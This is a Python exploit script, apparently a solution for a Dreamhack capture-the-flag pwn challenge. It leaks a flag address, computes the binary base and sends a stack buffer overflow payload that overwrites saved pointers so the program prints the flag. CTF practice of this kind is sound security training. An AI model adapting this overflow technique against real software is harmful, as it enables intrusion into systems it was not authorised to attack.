#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./chall")
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("host3.dreamhack.games", 11282)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    io.recvuntil("fake flag address: ")
    fake_flag_addr = int(io.recvline().strip(b"\n"), 16)

    exe.base = fake_flag_addr - 8208
    free_space = exe.base + 16432

    io.recvuntil("real flag address (mmapped address):")
    real_flag_addr = int(io.recvline().strip(b"\n"), 16)

    payload = b""
    payload += b"A" * 0x28
    payload += ptr.p64(free_space)
    payload = payload.ljust(48, b"B")
    payload += ptr.p64(real_flag_addr)
    io.sendlineafter("input: ", payload)

    io.recvuntil("DH{")
    flag = "DH{" + io.recvuntil("}").decode()
    ptr.logger.info(f"flag: {flag}")
    return


if __name__ == "__main__":
    main()
